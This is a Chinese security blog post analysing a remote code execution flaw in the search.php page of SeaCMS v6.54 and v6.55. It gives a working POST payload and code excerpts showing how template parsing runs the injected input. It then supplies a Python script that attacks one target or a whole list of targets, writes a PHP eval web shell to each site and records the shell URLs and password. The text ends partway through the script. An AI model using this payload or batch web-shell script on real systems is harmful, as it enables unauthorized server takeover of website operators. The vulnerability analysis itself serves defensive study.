<!DOCTYPE html>
<html lang="en">

<head>
    
<meta charset="utf-8">

<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">


<title>SeaCMS v6.54和v6.55前台Getshell 代码执行漏洞(每日一洞) - F0rmat的博客 | 专注于网络攻防和信息安全</title>

<meta name="description" content="前言 这两个版本修复上次的v6.45版本中的order传值后执行的漏洞，但是在新的版本里面利用parseIf函数的功能还可以继续利用。 因为上一篇也已经过了一遍search.php的执行过程，这篇就不再重复讲解了。 链接：http://getpass.cn/2018/03/02/SeaCMS%20v6.45%E5%89%8D%E5%8F%B0Getshell%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(%E6%AF%8F%E6%97%A5%E4%B8%80%E6%B4%9E)/
环境 Web： phpstudy System： Windows 10 X64 Browser： Firefox Quantum Python version ： 2.7
v6.54漏洞详情 漏洞代码执行 Payload get:http://seacms.test/search.php POST: searchtype=5&amp;amp;searchword={if{searchpage:year}&amp;amp;year=:e{searchpage:area}}&amp;amp;area=v{searchpage:letter}&amp;amp;letter=al{searchpage:lang}&amp;amp;yuyan=(join{searchpage:jq}&amp;amp;jq=($_P{searchpage:ver}&amp;amp;ver=OST[9]))&amp;amp;9[]=ph&amp;amp;9[]=pinfo();
执行结果 分析过程  这个版本只是把order的变量做了限制，但是声明为global变量的不止order,为什么不用其他而用order，在上一篇已经讲过了。  $order = RemoveXSS(stripslashes($order)); $order = addslashes(cn_substr($order,20));  我看了这次构造的POC，我也是佩服这位表哥，因为分析这些代码需要大量的时间。这次通过echoSearchPage函数里面的拼接功能，我们可以在没转换之前输出一下$content的内容，这里我推荐直接用highlight_string($content)直接输出，不用右键查看源代码了。 大家可以先在searchword替换前输出$content，可以看到还没有开始替换。 那我们在替换后，输出$content，可以看到已经拼接成型了。    156行 $content = str_replace(&amp;#34;{seacms:searchword}&amp;#34;,$searchword,$content); 。。。。。。。。。。 if(intval($searchtype)==5) { $tname = !empty($tid)?getTypeNameOnCache($tid):&amp;#39;全部&amp;#39;; $jq = !empty($jq)?$jq:&amp;#39;全部&amp;#39;; $area = !empty($area)?$area:&amp;#39;全部&amp;#39;; $year = !empty($year)?$year:&amp;#39;全部&amp;#39;; $yuyan = !empty($yuyan)?$yuyan:&amp;#39;全部&amp;#39;; $letter = !empty($letter)?$letter:&amp;#39;全部&amp;#39;; $state = !empty($state)?$state:&amp;#39;全部&amp;#39;; $ver = !" /><meta name="keywords"
  content="F0rmat, 信息安全, 网络安全, 红蓝攻防, 渗透测试, bypass, waf, 注入, 黑客" />


<link rel="stylesheet" href="https://getshe11.com/css/main.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.12/src/css/lightgallery.css">



<meta property="og:title" content="SeaCMS v6.54和v6.55前台Getshell 代码执行漏洞(每日一洞)" />
<meta property="og:description" content="前言 这两个版本修复上次的v6.45版本中的order传值后执行的漏洞，但是在新的版本里面利用parseIf函数的功能还可以继续利用。 因为上一篇也已经过了一遍search.php的执行过程，这篇就不再重复讲解了。 链接：http://getpass.cn/2018/03/02/SeaCMS%20v6.45%E5%89%8D%E5%8F%B0Getshell%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(%E6%AF%8F%E6%97%A5%E4%B8%80%E6%B4%9E)/
环境 Web： phpstudy System： Windows 10 X64 Browser： Firefox Quantum Python version ： 2.7
v6.54漏洞详情 漏洞代码执行 Payload get:http://seacms.test/search.php POST: searchtype=5&amp;searchword={if{searchpage:year}&amp;year=:e{searchpage:area}}&amp;area=v{searchpage:letter}&amp;letter=al{searchpage:lang}&amp;yuyan=(join{searchpage:jq}&amp;jq=($_P{searchpage:ver}&amp;ver=OST[9]))&amp;9[]=ph&amp;9[]=pinfo();
执行结果 分析过程  这个版本只是把order的变量做了限制，但是声明为global变量的不止order,为什么不用其他而用order，在上一篇已经讲过了。  $order = RemoveXSS(stripslashes($order)); $order = addslashes(cn_substr($order,20));  我看了这次构造的POC，我也是佩服这位表哥，因为分析这些代码需要大量的时间。这次通过echoSearchPage函数里面的拼接功能，我们可以在没转换之前输出一下$content的内容，这里我推荐直接用highlight_string($content)直接输出，不用右键查看源代码了。 大家可以先在searchword替换前输出$content，可以看到还没有开始替换。 那我们在替换后，输出$content，可以看到已经拼接成型了。    156行 $content = str_replace(&#34;{seacms:searchword}&#34;,$searchword,$content); 。。。。。。。。。。 if(intval($searchtype)==5) { $tname = !empty($tid)?getTypeNameOnCache($tid):&#39;全部&#39;; $jq = !empty($jq)?$jq:&#39;全部&#39;; $area = !empty($area)?$area:&#39;全部&#39;; $year = !empty($year)?$year:&#39;全部&#39;; $yuyan = !empty($yuyan)?$yuyan:&#39;全部&#39;; $letter = !empty($letter)?$letter:&#39;全部&#39;; $state = !empty($state)?$state:&#39;全部&#39;; $ver = !" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://getshe11.com/post/seacms-v6.54-and-v6.55-front-desk-getshell-code-execution-vulnerability-one-hole-a-day/" />
<meta property="article:published_time" content="2018-03-03T23:32:41+00:00" />
<meta property="article:modified_time" content="2018-03-03T23:32:41+00:00" />
<meta itemprop="name" content="SeaCMS v6.54和v6.55前台Getshell 代码执行漏洞(每日一洞)">
<meta itemprop="description" content="前言 这两个版本修复上次的v6.45版本中的order传值后执行的漏洞，但是在新的版本里面利用parseIf函数的功能还可以继续利用。 因为上一篇也已经过了一遍search.php的执行过程，这篇就不再重复讲解了。 链接：http://getpass.cn/2018/03/02/SeaCMS%20v6.45%E5%89%8D%E5%8F%B0Getshell%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(%E6%AF%8F%E6%97%A5%E4%B8%80%E6%B4%9E)/
环境 Web： phpstudy System： Windows 10 X64 Browser： Firefox Quantum Python version ： 2.7
v6.54漏洞详情 漏洞代码执行 Payload get:http://seacms.test/search.php POST: searchtype=5&amp;searchword={if{searchpage:year}&amp;year=:e{searchpage:area}}&amp;area=v{searchpage:letter}&amp;letter=al{searchpage:lang}&amp;yuyan=(join{searchpage:jq}&amp;jq=($_P{searchpage:ver}&amp;ver=OST[9]))&amp;9[]=ph&amp;9[]=pinfo();
执行结果 分析过程  这个版本只是把order的变量做了限制，但是声明为global变量的不止order,为什么不用其他而用order，在上一篇已经讲过了。  $order = RemoveXSS(stripslashes($order)); $order = addslashes(cn_substr($order,20));  我看了这次构造的POC，我也是佩服这位表哥，因为分析这些代码需要大量的时间。这次通过echoSearchPage函数里面的拼接功能，我们可以在没转换之前输出一下$content的内容，这里我推荐直接用highlight_string($content)直接输出，不用右键查看源代码了。 大家可以先在searchword替换前输出$content，可以看到还没有开始替换。 那我们在替换后，输出$content，可以看到已经拼接成型了。    156行 $content = str_replace(&#34;{seacms:searchword}&#34;,$searchword,$content); 。。。。。。。。。。 if(intval($searchtype)==5) { $tname = !empty($tid)?getTypeNameOnCache($tid):&#39;全部&#39;; $jq = !empty($jq)?$jq:&#39;全部&#39;; $area = !empty($area)?$area:&#39;全部&#39;; $year = !empty($year)?$year:&#39;全部&#39;; $yuyan = !empty($yuyan)?$yuyan:&#39;全部&#39;; $letter = !empty($letter)?$letter:&#39;全部&#39;; $state = !empty($state)?$state:&#39;全部&#39;; $ver = !">
<meta itemprop="datePublished" content="2018-03-03T23:32:41+00:00" />
<meta itemprop="dateModified" content="2018-03-03T23:32:41+00:00" />
<meta itemprop="wordCount" content="394">



<meta itemprop="keywords" content="漏洞,代码审计,php,SeaCMS,getshell," />
<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="SeaCMS v6.54和v6.55前台Getshell 代码执行漏洞(每日一洞)"/>
<meta name="twitter:description" content="前言 这两个版本修复上次的v6.45版本中的order传值后执行的漏洞，但是在新的版本里面利用parseIf函数的功能还可以继续利用。 因为上一篇也已经过了一遍search.php的执行过程，这篇就不再重复讲解了。 链接：http://getpass.cn/2018/03/02/SeaCMS%20v6.45%E5%89%8D%E5%8F%B0Getshell%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(%E6%AF%8F%E6%97%A5%E4%B8%80%E6%B4%9E)/
环境 Web： phpstudy System： Windows 10 X64 Browser： Firefox Quantum Python version ： 2.7
v6.54漏洞详情 漏洞代码执行 Payload get:http://seacms.test/search.php POST: searchtype=5&amp;searchword={if{searchpage:year}&amp;year=:e{searchpage:area}}&amp;area=v{searchpage:letter}&amp;letter=al{searchpage:lang}&amp;yuyan=(join{searchpage:jq}&amp;jq=($_P{searchpage:ver}&amp;ver=OST[9]))&amp;9[]=ph&amp;9[]=pinfo();
执行结果 分析过程  这个版本只是把order的变量做了限制，但是声明为global变量的不止order,为什么不用其他而用order，在上一篇已经讲过了。  $order = RemoveXSS(stripslashes($order)); $order = addslashes(cn_substr($order,20));  我看了这次构造的POC，我也是佩服这位表哥，因为分析这些代码需要大量的时间。这次通过echoSearchPage函数里面的拼接功能，我们可以在没转换之前输出一下$content的内容，这里我推荐直接用highlight_string($content)直接输出，不用右键查看源代码了。 大家可以先在searchword替换前输出$content，可以看到还没有开始替换。 那我们在替换后，输出$content，可以看到已经拼接成型了。    156行 $content = str_replace(&#34;{seacms:searchword}&#34;,$searchword,$content); 。。。。。。。。。。 if(intval($searchtype)==5) { $tname = !empty($tid)?getTypeNameOnCache($tid):&#39;全部&#39;; $jq = !empty($jq)?$jq:&#39;全部&#39;; $area = !empty($area)?$area:&#39;全部&#39;; $year = !empty($year)?$year:&#39;全部&#39;; $yuyan = !empty($yuyan)?$yuyan:&#39;全部&#39;; $letter = !empty($letter)?$letter:&#39;全部&#39;; $state = !empty($state)?$state:&#39;全部&#39;; $ver = !"/>

<!--[if lte IE 9]>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
<![endif]-->

<!--[if lt IE 9]>
  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
<![endif]-->
</head>

<body>
    <div class="header-placeholder"></div>
    
    <header class="header">
        <div class="wrapper">
    <div id="sidebar-toggle">TOC</div>
    
    <a class="site-title" href="https://getshe11.com/.">F0rmat</a>
    
    <nav class="site-nav">
        <a class="page-link" href="/">Home</a><a class="page-link" href="/post/">Category</a>
    </nav>
</div>

    </header>

    
    <div class="page-content">
        <div class="wrapper">
            
            <div class="col-main">
                <div class="post">
    
    <header class="post-header">
        <h1 class="post-title">SeaCMS V6.54和v6.55前台Getshell 代码执行漏洞(每日一洞)</h1>
        <p class="post-meta">Mar 03, 2018</p>
    </header>
    <article class="post-content">
        
        
        
        
        
        
        <h1 id="前言">前言</h1>
<p>这两个版本修复上次的v6.45版本中的order传值后执行的漏洞，但是在新的版本里面利用<code>parseIf</code>函数的功能还可以继续利用。
因为上一篇也已经过了一遍<code>search.php</code>的执行过程，这篇就不再重复讲解了。
链接：http://getpass.cn/2018/03/02/SeaCMS%20v6.45%E5%89%8D%E5%8F%B0Getshell%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(%E6%AF%8F%E6%97%A5%E4%B8%80%E6%B4%9E)/</p>
<h1 id="环境">环境</h1>
<p><strong>Web：</strong> phpstudy
<strong>System：</strong> Windows 10 X64
<strong>Browser：</strong> Firefox Quantum
<strong>Python version ：</strong> 2.7</p>
<h1 id="v654漏洞详情">v6.54漏洞详情</h1>
<h2 id="漏洞代码执行">漏洞代码执行</h2>
<h3 id="payload">Payload</h3>
<p><strong>get:</strong><code>http://seacms.test/search.php</code>
<strong>POST:</strong> <code>searchtype=5&amp;searchword={if{searchpage:year}&amp;year=:e{searchpage:area}}&amp;area=v{searchpage:letter}&amp;letter=al{searchpage:lang}&amp;yuyan=(join{searchpage:jq}&amp;jq=($_P{searchpage:ver}&amp;ver=OST[9]))&amp;9[]=ph&amp;9[]=pinfo();</code></p>
<h3 id="执行结果">执行结果</h3>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/seacms_1.png" alt=""></p>
<!-- raw HTML omitted -->
<h2 id="分析过程">分析过程</h2>
<ul>
<li>这个版本只是把<code>order</code>的变量做了限制，但是声明为global变量的不止<code>order</code>,为什么不用其他而用<code>order</code>，在上一篇已经讲过了。</li>
</ul>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="nv">$order</span> <span class="o">=</span> <span class="nx">RemoveXSS</span><span class="p">(</span><span class="nx">stripslashes</span><span class="p">(</span><span class="nv">$order</span><span class="p">));</span>
<span class="nv">$order</span> <span class="o">=</span> <span class="nx">addslashes</span><span class="p">(</span><span class="nx">cn_substr</span><span class="p">(</span><span class="nv">$order</span><span class="p">,</span><span class="mi">20</span><span class="p">));</span>
</code></pre></div><ul>
<li>我看了这次构造的POC，我也是佩服这位表哥，因为分析这些代码需要大量的时间。这次通过<code>echoSearchPage</code>函数里面的拼接功能，我们可以在没转换之前输出一下$content的内容，这里我推荐直接用<code>highlight_string($content)</code>直接输出，不用右键查看源代码了。
大家可以先在<code>searchword</code>替换前输出<code>$content</code>，可以看到还没有开始替换。
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/seacms_2.png" alt="">
那我们在替换后，输出<code>$content</code>，可以看到已经拼接成型了。
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/seacms_3.png" alt=""></li>
</ul>
<hr>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="mi">156</span><span class="nx">行</span> <span class="nv">$content</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;{seacms:searchword}&#34;</span><span class="p">,</span><span class="nv">$searchword</span><span class="p">,</span><span class="nv">$content</span><span class="p">);</span>
<span class="nx">。。。。。。。。。。</span>
<span class="k">if</span><span class="p">(</span><span class="nx">intval</span><span class="p">(</span><span class="nv">$searchtype</span><span class="p">)</span><span class="o">==</span><span class="mi">5</span><span class="p">)</span>
<span class="p">{</span>
    <span class="nv">$tname</span> <span class="o">=</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$tid</span><span class="p">)</span><span class="o">?</span><span class="nx">getTypeNameOnCache</span><span class="p">(</span><span class="nv">$tid</span><span class="p">)</span><span class="o">:</span><span class="s1">&#39;全部&#39;</span><span class="p">;</span>
    <span class="nv">$jq</span> <span class="o">=</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$jq</span><span class="p">)</span><span class="o">?</span><span class="nv">$jq</span><span class="o">:</span><span class="s1">&#39;全部&#39;</span><span class="p">;</span>
    <span class="nv">$area</span> <span class="o">=</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$area</span><span class="p">)</span><span class="o">?</span><span class="nv">$area</span><span class="o">:</span><span class="s1">&#39;全部&#39;</span><span class="p">;</span>
    <span class="nv">$year</span> <span class="o">=</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$year</span><span class="p">)</span><span class="o">?</span><span class="nv">$year</span><span class="o">:</span><span class="s1">&#39;全部&#39;</span><span class="p">;</span>
    <span class="nv">$yuyan</span> <span class="o">=</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$yuyan</span><span class="p">)</span><span class="o">?</span><span class="nv">$yuyan</span><span class="o">:</span><span class="s1">&#39;全部&#39;</span><span class="p">;</span>
    <span class="nv">$letter</span> <span class="o">=</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$letter</span><span class="p">)</span><span class="o">?</span><span class="nv">$letter</span><span class="o">:</span><span class="s1">&#39;全部&#39;</span><span class="p">;</span>
    <span class="nv">$state</span> <span class="o">=</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$state</span><span class="p">)</span><span class="o">?</span><span class="nv">$state</span><span class="o">:</span><span class="s1">&#39;全部&#39;</span><span class="p">;</span>
    <span class="nv">$ver</span> <span class="o">=</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$ver</span><span class="p">)</span><span class="o">?</span><span class="nv">$ver</span><span class="o">:</span><span class="s1">&#39;全部&#39;</span><span class="p">;</span>
    <span class="nv">$money</span> <span class="o">=</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$money</span><span class="p">)</span><span class="o">?</span><span class="nv">$money</span><span class="o">:</span><span class="s1">&#39;全部&#39;</span><span class="p">;</span>
  <span class="nv">$content</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;{searchpage:type}&#34;</span><span class="p">,</span><span class="nv">$tid</span><span class="p">,</span><span class="nv">$content</span><span class="p">);</span>
    <span class="nv">$content</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;{searchpage:typename}&#34;</span><span class="p">,</span><span class="nv">$tname</span> <span class="p">,</span><span class="nv">$content</span><span class="p">);</span>
    <span class="nv">$content</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;{searchpage:year}&#34;</span><span class="p">,</span><span class="nv">$year</span><span class="p">,</span><span class="nv">$content</span><span class="p">);</span>
    <span class="nv">$content</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;{searchpage:area}&#34;</span><span class="p">,</span><span class="nv">$area</span><span class="p">,</span><span class="nv">$content</span><span class="p">);</span>
    <span class="nv">$content</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;{searchpage:letter}&#34;</span><span class="p">,</span><span class="nv">$letter</span><span class="p">,</span><span class="nv">$content</span><span class="p">);</span>
    <span class="nv">$content</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;{searchpage:lang}&#34;</span><span class="p">,</span><span class="nv">$yuyan</span><span class="p">,</span><span class="nv">$content</span><span class="p">);</span>
    <span class="nv">$content</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;{searchpage:jq}&#34;</span><span class="p">,</span><span class="nv">$jq</span><span class="p">,</span><span class="nv">$content</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="nv">$state</span><span class="o">==</span><span class="s1">&#39;w&#39;</span><span class="p">){</span><span class="nv">$state2</span><span class="o">=</span><span class="s2">&#34;完结&#34;</span><span class="p">;}</span><span class="k">elseif</span><span class="p">(</span><span class="nv">$state</span><span class="o">==</span><span class="s1">&#39;l&#39;</span><span class="p">){</span><span class="nv">$state2</span><span class="o">=</span><span class="s2">&#34;连载中&#34;</span><span class="p">;}</span><span class="k">else</span><span class="p">{</span><span class="nv">$state2</span><span class="o">=</span><span class="s2">&#34;全部&#34;</span><span class="p">;}</span>
    <span class="k">if</span><span class="p">(</span><span class="nv">$money</span><span class="o">==</span><span class="s1">&#39;m&#39;</span><span class="p">){</span><span class="nv">$money2</span><span class="o">=</span><span class="s2">&#34;免费&#34;</span><span class="p">;}</span><span class="k">elseif</span><span class="p">(</span><span class="nv">$money</span><span class="o">==</span><span class="s1">&#39;s&#39;</span><span class="p">){</span><span class="nv">$money2</span><span class="o">=</span><span class="s2">&#34;收费&#34;</span><span class="p">;}</span><span class="k">else</span><span class="p">{</span><span class="nv">$money2</span><span class="o">=</span><span class="s2">&#34;全部&#34;</span><span class="p">;}</span>
    <span class="nv">$content</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;{searchpage:state}&#34;</span><span class="p">,</span><span class="nv">$state2</span><span class="p">,</span><span class="nv">$content</span><span class="p">);</span>
    <span class="nv">$content</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;{searchpage:money}&#34;</span><span class="p">,</span><span class="nv">$money2</span><span class="p">,</span><span class="nv">$content</span><span class="p">);</span>
    <span class="nv">$content</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;{searchpage:ver}&#34;</span><span class="p">,</span><span class="nv">$ver</span><span class="p">,</span><span class="nv">$content</span><span class="p">);</span>
    <span class="nv">$content</span><span class="o">=</span><span class="nv">$mainClassObj</span><span class="o">-&gt;</span><span class="na">parsePageList</span><span class="p">(</span><span class="nv">$content</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nv">$page</span><span class="p">,</span><span class="nv">$pCount</span><span class="p">,</span><span class="nv">$TotalResult</span><span class="p">,</span><span class="s2">&#34;cascade&#34;</span><span class="p">);</span>
    <span class="nv">$content</span><span class="o">=</span><span class="nv">$mainClassObj</span><span class="o">-&gt;</span><span class="na">parseSearchItemList</span><span class="p">(</span><span class="nv">$content</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">);</span>
    <span class="nv">$content</span><span class="o">=</span><span class="nv">$mainClassObj</span><span class="o">-&gt;</span><span class="na">parseSearchItemList</span><span class="p">(</span><span class="nv">$content</span><span class="p">,</span><span class="s2">&#34;year&#34;</span><span class="p">);</span>
    <span class="nv">$content</span><span class="o">=</span><span class="nv">$mainClassObj</span><span class="o">-&gt;</span><span class="na">parseSearchItemList</span><span class="p">(</span><span class="nv">$content</span><span class="p">,</span><span class="s2">&#34;area&#34;</span><span class="p">);</span>
    <span class="nv">$content</span><span class="o">=</span><span class="nv">$mainClassObj</span><span class="o">-&gt;</span><span class="na">parseSearchItemList</span><span class="p">(</span><span class="nv">$content</span><span class="p">,</span><span class="s2">&#34;letter&#34;</span><span class="p">);</span>
    <span class="nv">$content</span><span class="o">=</span><span class="nv">$mainClassObj</span><span class="o">-&gt;</span><span class="na">parseSearchItemList</span><span class="p">(</span><span class="nv">$content</span><span class="p">,</span><span class="s2">&#34;lang&#34;</span><span class="p">);</span>
    <span class="nv">$content</span><span class="o">=</span><span class="nv">$mainClassObj</span><span class="o">-&gt;</span><span class="na">parseSearchItemList</span><span class="p">(</span><span class="nv">$content</span><span class="p">,</span><span class="s2">&#34;jq&#34;</span><span class="p">);</span>
    <span class="nv">$content</span><span class="o">=</span><span class="nv">$mainClassObj</span><span class="o">-&gt;</span><span class="na">parseSearchItemList</span><span class="p">(</span><span class="nv">$content</span><span class="p">,</span><span class="s2">&#34;state&#34;</span><span class="p">);</span>
    <span class="nv">$content</span><span class="o">=</span><span class="nv">$mainClassObj</span><span class="o">-&gt;</span><span class="na">parseSearchItemList</span><span class="p">(</span><span class="nv">$content</span><span class="p">,</span><span class="s2">&#34;ver&#34;</span><span class="p">);</span>
    <span class="nv">$content</span><span class="o">=</span><span class="nv">$mainClassObj</span><span class="o">-&gt;</span><span class="na">parseSearchItemList</span><span class="p">(</span><span class="nv">$content</span><span class="p">,</span><span class="s2">&#34;money&#34;</span><span class="p">);</span>
<span class="p">}</span><span class="o">.</span>
</code></pre></div><ul>
<li>又到<code>parseIf</code>处理这里了，我们都可以使用<code>highlight_string($content)</code>和<code>var_dump($iar[1])</code>来输出匹配前和匹配后的结果。
匹配前：
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/seacms_4.png" alt="">
匹配后：
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/seacms_5.png" alt="">
所以又执行了我们传参进去的代码。</li>
</ul>
<h3 id="构造poc">构造POC</h3>
<p>这个是大佬给出的POC：
<code>searchtype=5&amp;searchword={if{searchpage:year}&amp;year=:e{searchpage:area}}&amp;area=v{searchpage:letter}&amp;letter=al{searchpage:lang}&amp;yuyan=(join{searchpage:jq}&amp;jq=($_P{searchpage:ver}&amp;ver=OST[9]))&amp;9[]=ph&amp;9[]=pinfo();</code></p>
<p>其实很简单，每个参数做了限制，传入的字符串个数不能超过20个就行了。
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/seacms_6.png" alt="">
<code>9</code>就是$_POST[9]里面的值，可以任意修改只要不超过20个字符。</p>
<h2 id="用python编写批量getshell脚本">用Python编写批量Getshell脚本</h2>
<p>只是在上一个脚本做下修改就行了，同样支持单个和批量getshell。
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/seacms_7.png" alt=""></p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="s1">&#39;&#39;&#39;
</span><span class="s1">author:F0rmat
</span><span class="s1">&#39;&#39;&#39;</span>

<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">threading</span>
<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">target</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">==</span> <span class="s2">&#34;-f&#34;</span><span class="p">:</span>
        <span class="n">target</span><span class="o">=</span><span class="n">target</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
    <span class="n">url</span><span class="o">=</span><span class="n">target</span><span class="o">+</span><span class="s2">&#34;/search.php&#34;</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;fwrite(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[f0rmat])?&gt;f0rmat&#39;);&#34;</span>
    <span class="n">data</span><span class="o">=</span><span class="p">{</span>
        <span class="s2">&#34;searchtype&#34;</span><span class="p">:</span><span class="s2">&#34;5&#34;</span><span class="p">,</span>
        <span class="s2">&#34;searchword&#34;</span><span class="p">:</span><span class="s2">&#34;{if{searchpage:year}&#34;</span><span class="p">,</span>
        <span class="s2">&#34;year&#34;</span><span class="p">:</span><span class="s2">&#34;:e{searchpage:area}}&#34;</span><span class="p">,</span>
        <span class="s2">&#34;area&#34;</span><span class="p">:</span><span class="s2">&#34;v{searchpage:letter}&#34;</span><span class="p">,</span>
        <span class="s2">&#34;letter&#34;</span><span class="p">:</span><span class="s2">&#34;al{searchpage:lang}&#34;</span><span class="p">,</span>
        <span class="s2">&#34;yuyan&#34;</span><span class="p">:</span><span class="s2">&#34;(join{searchpage:jq}&#34;</span><span class="p">,</span>
        <span class="s2">&#34;jq&#34;</span><span class="p">:</span><span class="s2">&#34;($_P{searchpage:ver}&#34;</span><span class="p">,</span>
        <span class="s2">&#34;ver&#34;</span><span class="p">:</span><span class="s2">&#34;OST[9]))&#34;</span><span class="p">,</span>
        <span class="s2">&#34;9[]&#34;</span><span class="p">:</span><span class="n">payload</span><span class="p">,</span>
    <span class="p">}</span>

    <span class="n">shell</span> <span class="o">=</span> <span class="n">target</span><span class="o">+</span><span class="s1">&#39;/shell.php&#39;</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
        <span class="n">verify</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">shell</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">3</span><span class="p">)</span>
        <span class="k">if</span> <span class="s2">&#34;f0rmat&#34;</span> <span class="ow">in</span> <span class="n">verify</span><span class="o">.</span><span class="n">content</span><span class="p">:</span>
            <span class="k">print</span> <span class="s1">&#39;Write success,shell url:&#39;</span><span class="p">,</span><span class="n">shell</span><span class="p">,</span><span class="s1">&#39;pass:f0rmat&#39;</span>
            <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;success.txt&#34;</span><span class="p">,</span><span class="s2">&#34;a+&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
                <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">shell</span><span class="o">+</span><span class="s1">&#39;  pass:f0rmat&#39;</span><span class="o">+</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">print</span> <span class="n">target</span><span class="p">,</span><span class="s1">&#39;Write failure!&#39;</span>
    <span class="k">except</span> <span class="ne">Exception</span><span class="p">,</span> <span class="n">e</span><span class="p">:</span>
        <span class="k">print</span> <span class="n">e</span>
<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span><span class="o">&lt;</span><span class="mi">3</span><span class="p">:</span>
        <span class="k">print</span> <span class="s1">&#39;python check_order.py.py -h target/-f target-file&#39;</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;-h&#34;</span><span class="p">:</span>
            <span class="n">exploit</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
        <span class="k">elif</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;-f&#34;</span><span class="p">:</span>
            <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="s2">&#34;r&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
                <span class="n">b</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span>
